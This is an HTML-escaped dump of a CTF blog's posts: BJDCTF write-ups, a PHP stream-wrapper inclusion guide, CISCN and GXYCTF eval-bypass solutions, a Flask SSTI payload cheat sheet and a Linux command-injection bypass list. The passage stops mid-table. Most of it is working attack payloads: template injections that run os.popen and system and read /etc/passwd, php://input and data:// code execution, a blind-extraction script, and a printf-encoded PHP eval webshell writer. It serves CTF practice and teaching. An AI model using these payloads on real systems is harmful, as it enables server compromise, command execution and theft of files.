&#125; $detect &#x3D; @file_get_contents($url, false); print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt; 利用sprintf格式化字符漏洞 payload 123q1&#x3D;y&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?&amp;q3&#x3D;GET%25s%25&#x2F;&#x2F;admin.php?中的?是为了把拼接的.y1ng.txt当成参数废掉&#x2F;&#x2F;%25是%的url编码,第一个%s是为了格式化得到detect的值,第二个%是为转移掉%d使其变成%%d,格式化输出结果就是%d 得到admin.php的源码, 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(0);session_start();$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fakefunction aesEn($data, $key)&#123; $method &#x3D; &#39;AES-128-CBC&#39;; $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;))) return true; else return false;&#125;if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; else &#123; echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);if (isset($_GET[&#39;decrypt&#39;])) &#123; $decr &#x3D; $_GET[&#39;decrypt&#39;]; if (Check())&#123; $data &#x3D; $_SESSION[&#39;secret&#39;]; include &#39;flag_2sln2ndln2klnlksnf.php&#39;; $cipher &#x3D; aesEn($data, &#39;y1ng&#39;); if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die(&#39;爬&#39;); &#125; &#125; else&#123; header(&quot;Refresh:0.1;url&#x3D;index.php&quot;); &#125;&#125; else &#123; &#x2F;&#x2F;I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length &#x3D; mt_rand(40,80); $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));&#125;?&gt; exp 12345678910111213141516171819function aesEn ($key) &#123; $method &#x3D; &#39;AES-128-CBC&#39;; $iv &#x3D; md5(&#39;174.0.222.75&#39;, true); return base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));&#125;$url &#x3D; &quot;http:&#x2F;&#x2F;65a5817a-c324-407c-af18-b7c448bc09b4.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&quot;;$cookes &#x3D; &quot;y1ng&#x3D;8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address&#x3D;76d9f00467e5ee6abc3ca60892ef304e&quot;;$curl &#x3D; curl_init();curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_COOKIE, $cookes);$cipher &#x3D; aesEn(&#39;y1ng&#39;);$url &#x3D; $url . urlencode($cipher);curl_setopt($curl, CURLOPT_URL, $url);$result &#x3D; curl_exec($curl);var_dump($result);?&gt;&#x2F;&#x2F;加密方式知道,所以访问一下admin.php得到你访问的ip&#x2F;&#x2F;不穿PHPsessionid,session就为空,所以加密的data等于null,只要加密key就行 MISC最简单MISC7z打开,解压得到文件sercet winhex查看,缺少PNG的文件头,补上文件头再修改后缀为png打开得到flag A_Beautiful_Picturewinhex打开,图片高改高得到flag EasyBaBabinwalk分析图片 分理出压缩包,压缩包内是视频,打开视频,中间有一串很快的图片 用windows自带的照片视频打开,点编辑,一帧帧的看,有二维码的页面扫码得到下面文字 1424A447B79316E677A756973687561697D hex转ASCII,调整一下顺序组成一句话,得到flag 小姐姐1strings xiaojiejie.jpeg|grep BJD Crypto签到-y1ngbase64解码得到flag 老文盲用百度翻译朗读 BJD{这就是flag},中间是原汉字 燕言燕语179616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20 hex转ASCII 得到：yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; 如果是rot13,偏移量应该相同,但是这里不同,所以是维吉尼亚密码 yanzi 是 key，解密一下得到 flag 灵能精通下载得到jpg,改后缀为jpg,打开发现是一些符号,搜索一下得知是圣堂武士密码,是猪圈密码的变形 对应解密得到IMKNIGHTSTEMPLAR包上flagflag&#123;IMKNIGHTSTEMPLAR&#125; cat_flag猫转二进制 123456789101101000010010010100100010001111011010011010010000101100001001100000111111001111101BJD&#123;M!a0~&#125;","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"PHP伪协议","date":"2020-03-15T16:00:00.000Z","path":"2020/03/16/CTF/php伪协议/","text":"PHP伪协议0x00 何为伪协议PHP官网的解释: PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 支持的协议: 123456789101112file:&#x2F;&#x2F; — 访问本地文件系统http:&#x2F;&#x2F; — 访问 HTTP(s) 网址ftp:&#x2F;&#x2F; — 访问 FTP(s) URLsphp:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）zlib:&#x2F;&#x2F; — 压缩流data:&#x2F;&#x2F; — 数据（RFC 2397）glob:&#x2F;&#x2F; — 查找匹配的文件路径模式phar:&#x2F;&#x2F; — PHP 归档ssh2:&#x2F;&#x2F; — Secure Shell 2rar:&#x2F;&#x2F; — RARogg:&#x2F;&#x2F; — 音频流expect:&#x2F;&#x2F; — 处理交互式的流 0x01 用法file:// PHP.ini：file:// 协议在双off的情况下也可以正常使用；allow_url_fopen ：off/onallow_url_include：off/on file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件 且不受allow_url_fopen与allow_url_include的影响 123456789&#x2F;&#x2F;file.php&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123; include $_GET[&#39;file&#39;];&#125;?&gt;&#x2F;&#x2F;使用file:&#x2F;&#x2F; [文件的绝对路径和文件名]来访问文件http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;&#x2F;html&#x2F;phpinfo.php php:// php://filter在双off的情况下也可以正常使用；php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。 php:// 访问各个输入/输出流（I/O streams） 在CTF中经常使用的是php://filter和php://input php://filter用于读取源码 php://input用于执行php代码。 php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 123456resource&#x3D;&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read&#x3D;&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write&#x3D;&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;;两个链的筛选列表&gt; 任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&#x2F;&#x2F;可以以base64编码的方式读取index.php的内容 过滤器字符串过滤器1234string.rot13 等同于用 str_rot13()函数处理所有的流数据string.toupper 等同于用 strtoupper()函数处理所有的流数据string.tolower 等同于用 strtolower()函数处理所有的流数据string.strip_tags 等同于用 strip_tags()函数处理所有的流数据 转换过滤器1234convert.base64-encode 等同于base64_encode()函数处理所有的流数据convert.base64-decode 等同于base64_decode()函数处理所有的流数据convert.quoted-printable-encode 没有对应函数convert.quoted-printable-decode 等同于用 quoted_printable_decode()函数处理所有的流数据 压缩过滤器12zlib.deflate 压缩zlib.inflate 解压 加密过滤器mcrypt mdecrypt 用的不多,不说了 php://inputphp://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。 注：enctype=”multipart/form-data” 的时候 php://input 是无效的。 allow_url_fopen ：off/onallow_url_include：on payload 123url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;input&#x2F;&#x2F;postdataa&#x3D;&lt;?php phpinfo();?&gt; 实例 12345678910111213$user &#x3D; $_GET[&quot;user&quot;];$file &#x3D; $_GET[&quot;file&quot;];$pass &#x3D; $_GET[&quot;pass&quot;];if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;the user is admin&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); &#x2F;&#x2F;class.php&#125;else&#123; echo &quot;you are not admin ! &quot;;&#125;解法为 url&#x2F;index.php?user&#x3D;php:&#x2F;&#x2F;input [POSTDATA] the user is admin最后输出为hello admin!并且包含对应文件 php://output是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 payload 1234567#file.php&lt;?php $code&#x3D;$_GET[&quot;page&quot;]; file_put_contents($code,&quot;test&quot;); ?&gt;url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;output&#x2F;&#x2F;结果输出test data://data:资源类型;编码,内容数据流封装器当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行 PHP.ini：data://协议必须双在on才能正常使用；allow_url_fopen ：onallow_url_include：onphp 版本大于等于 php5.2 payload 12345678$file.php&lt;?php $filename&#x3D;$_GET[&quot;a&quot;]; include(&quot;$filename&quot;); ?&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;orhttp:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; zip://, bzip2://, zlib:// PHP.ini：zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；allow_url_fopen ：off/onallow_url_include：off/on 12343个封装协议，都是直接打开压缩文件。compress.zlib:&#x2F;&#x2F;file.gz - 处理的是 &#39;.gz&#39; 后缀的压缩包compress.bzip2:&#x2F;&#x2F;file.bz2 - 处理的是 &#39;.bz2&#39; 后缀的压缩包zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt - 处理的是 &#39;.zip&#39; 后缀的压缩包里的文件 注：zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 zip://php 版本大于等于 php5.3.0 payload 1234zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txtzip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]**要用绝对路径+url编码# bzip2://payload 12compress.bzip2:&#x2F;&#x2F;file.bz2相对路径也可以 示例 1234用7-zip生成一个bz2压缩文件。pyload:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.bz2或者文件改为jpg后缀http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.jpg zlib://同理","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"[CISCN 2019 初赛]Love Math","date":"2020-03-15T16:00:00.000Z","path":"2020/03/16/CTF_WP/[CISCN 2019 初赛]Love Math/","text":"[CISCN 2019 初赛]Love Math WP12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__);&#125;else&#123; &#x2F;&#x2F;例子 c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; &#x2F;&#x2F;帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; payload123456?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flagbase_convert(37907361743,10,36)&#x3D;&gt;hex2bindechex(1598506324)&#x3D;&gt;&quot;5f474554&quot;hex2bin(&quot;5f474554&quot;)&#x3D;&gt;_GET$$pi&#x3D;&gt;$_GET($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag&#x3D;&gt;$_GET&#123;pi&#125;$_GET&#123;cos&#125;pi&#x3D;system&amp;cos&#x3D;cat 相同类型 [NESTCTF 2019]Love Math 1 [NESTCTF 2019]Love Math 2 Reference[CISCN 2019 初赛]Love Math","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"[GXYCTF2019]禁止套娃","date":"2020-03-15T16:00:00.000Z","path":"2020/03/16/CTF_WP/[GXYCTF2019]禁止套娃 WP/","text":"[GXYCTF2019]禁止套娃知识点123456789localeconv() 函数返回一包含本地数字及货币格式信息的数组。scandir() 列出 images 目录中的文件和目录。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos() current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。array_reverse()以相反的元素顺序返回数组。highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。show_source() 显示文件内容 WPimg后面的参数base32,base63,hex解码得555.png index.php hex,base64,base32编码传参img在网页源代码img标签解码base64得到源码 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123; if (!preg_match(&#39;&#x2F;data:\\&#x2F;\\&#x2F;|filter:\\&#x2F;\\&#x2F;|php:\\&#x2F;\\&#x2F;|phar:\\&#x2F;\\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123; if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\\((?R)?\\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123; if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123; &#x2F;&#x2F; echo $_GET[&#39;exp&#39;]; @eval($_GET[&#39;exp&#39;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;&#x2F;&#x2F; highlight_file(__FILE__);?&gt; payload1?exp&#x3D;show_source(next(array_reverse(scandir(current(localeconv()))))); 主要利用点pos(localeconv())或者current(localeconv())变成. array_reverse数组反转 next将指针指向第二个,为flag.php","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"FlaskSSTI","date":"2020-03-14T16:00:00.000Z","path":"2020/03/15/CTF/FlaskSSTI姿势/","text":"FlaskSSTI0x00魔术方法 dict：保存类实例或对象实例的属性变量键值对字典 class：返回调用的参数类型 mro：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 bases：返回类型列表 subclasses：返回object的子类 init：类的初始化方法 globals：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 __base__ 和 __mro__ 都是用来寻找基类的。 0x01基本流程可以利用2简单代码测试是否存在SSTI 使用魔术方法进行函数解析，再获取基本类object： 12345&#39;&#39;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用 获取到基本类之后,可以继续使用subclasses获取object的子类: 1234object.__subclasses__()#改变数字可以爆破object.__subclasses__[10] 找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的): 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__ 查看其引用 __builtins__ 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] 读写文件 12345678#读&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()#写&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).write()#若存在子模块,可以直接调用读写文件[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).write() 0x02命令执行利用eval 进行命令执行1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;) 利用warnings.catch_warnings 进行命令执行查看warnings.catch_warnings方法的位置 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59 查看linecatch的位置 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)25 查找os模块的位置 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)12 查找system方法的位置(在这里使用os.open().read()可以实现一样的效果,步骤一样,不再复述) 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)144 调用system方法 1&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)root0 利用commands 进行命令执行123&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() 0x04常见绕过方式绕过中括号pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read() 在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过 过滤引号request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤 1&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd 先获取chr函数，赋值给chr，后面拼接字符串就好了： 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; 过滤下划线同样利用request.args属性 1&#123;&#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ 将其中的request.args改为request.values则利用post的方式进行传参 1234#GET:&#123;&#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;#POST:class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__ 过滤关键字base64编码绕过__getattribute__使用实例访问属性时,调用该方法 例如被过滤掉__class__关键词 1&#123;&#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125; 字符串拼接绕过 1&#123;&#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125; 同时绕过下划线、与中括号1&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)|attr(request.values.name5)()&#125;&#125;post:name1&#x3D;__class__&amp;name2&#x3D;__base__&amp;name3&#x3D;__subclasses__&amp;name4&#x3D;pop&amp;name5&#x3D;read 绕过.过滤若.也被过滤，使用原生JinJa2函数|attr()将request.__class__改成request|attr(&quot;__class__&quot;) 读取config中flag,绕过直接使用config1&#123;&#123;config&#125;&#125; 利用self1&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; 还可以利用flask的内置函数和类url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等 123&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125; 过滤大括号1可以利用&#123;%%&#125;替代&#123;&#123;&#125;&#125; 盲注文件内容12345678910111213141516171819202122232425&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;flag&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39;%&#125;~p0~&#123;% endif %&#125;#脚本import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;&#39;def check(payload): postdata &#x3D; &#123; &#39;exploit&#39;:payload &#125; r &#x3D; requests.post(url, data&#x3D;postdata).content return &#39;~p0~&#39; in rpassword &#x3D; &#39;&#39;s &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\\\]^&#96;&#123;|&#125;~\\&#39;&quot;_%&#39;for i in xrange(0,100): for c in s: payload &#x3D; &#39;&#123;% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;flag&quot;).read()[&#39;+str(i)+&#39;:&#39;+str(i+1)+&#39;] &#x3D;&#x3D; &quot;&#39;+c+&#39;&quot; %&#125;~p0~&#123;% endif %&#125;&#39; if check(payload): password +&#x3D; c break print password 0x05常用payload1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"Python","slug":"Python","permalink":"https://yanmymickey.github.io/tags/Python/"},{"name":"FlaskSSTI","slug":"FlaskSSTI","permalink":"https://yanmymickey.github.io/tags/FlaskSSTI/"}]},{"title":"命令执行的各种姿势","date":"2020-03-11T16:00:00.000Z","path":"2020/03/12/CTF/linux命令执行的姿势/","text":"命令执行的各种姿势比赛比的是组合拳,理解原理,灵活运用 姿势一些命令分隔符12Linux中：%0a(可以表示命令结束) 、%0d 、; 、&amp; 、| 、&amp;&amp;、||Windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符） 绕过空格12#下面这些都可以起到和空格样的作用&lt;,&lt;&gt;,%20(空格),%09(Tab),$IFS$9(也可以用$1等等,只是$9在linux始终为空字符),$&#123;IFS&#125;,$IFS 巧用花括号123在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令&#123;ls,&#125;Desktop Documents ... 黑名单绕过拼接绕过12比如：a&#x3D;l;b&#x3D;s;$a$b就相当于ls 编码绕过base64编码123#注意,需要使用管道符,因为base64命令只接受标准的输入和输出echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bashcat &#x2F;flag Hex12#由于linux自动解析hex,所以可以使用hex绕过,\\x20是空格,也可能被ban &#x3D;&#x3D;&gt;cat &#x2F;flag oct1234567891011121314151617181920#&#123;&#125;或者()都可以$把这个输出当成变量,然后执行$(printf &quot;\\154\\163&quot;) &#x3D;&#x3D;&gt;ls$(printf &quot;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;$&#123;printf,&quot;\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76&quot;&#125; &gt;&gt; a.php#利用反引号&#96;&#96;printf &quot;\\154\\163&quot;&#96;--&gt;&gt;ls#绕过&#x2F;printf &quot;2f&quot; &#x2F;或者可以从$PATH中取&#x2F; echo $PATH|cut -c 1 单引号和双引号绕过，反斜杠绕过12345ca&#39;&#39;t flag ca&quot;&quot;t flag ca\\t flag都相当于cat flag 长度限制1234linux下可以用 &gt;a 创建文件名为a的空文件ls -t&gt;test则会将目录按时间排序后写进test文件中sh命令可以从一个文件中读取命令来执行https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2748 利用Shell 特殊变量绕过 变量 含义 $0 当前脚本的文件名 $n 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。 $# 传递给脚本或函数的参数个数 $* 传递给脚本或函数的所有参数，而参数不存在时其值为空。 $@ 